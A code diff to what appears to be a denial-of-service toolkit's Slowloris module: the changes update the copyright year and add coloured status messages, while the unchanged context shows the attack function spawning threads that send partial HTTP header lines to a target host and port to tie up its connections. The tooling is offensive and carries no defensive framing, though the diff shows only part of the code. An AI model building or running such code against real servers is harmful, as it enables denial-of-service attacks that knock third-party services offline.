@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -37,7 +37,7 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting SLOWLORIS attack...")
 	
 	threads_list = []
 
@@ -59,13 +59,13 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 				try:
 					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 				except socket.error:
-					print("[ERROR] Failed!")
+					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create socket!")
 				else:
-					print("[BEGIN] Sending to " + target + "...")
+					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending packets to " + target + "...")
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[BEGIN] Starting thread " + str(thread) + "...")
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Starting thread " + str(thread) + "...")
 		t = Thread(target = slowloris_flood)
 		t.start()
 		threads_list.append(t)
@@ -76,4 +76,4 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] SLOWLORIS attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" SLOWLORIS attack completed.")
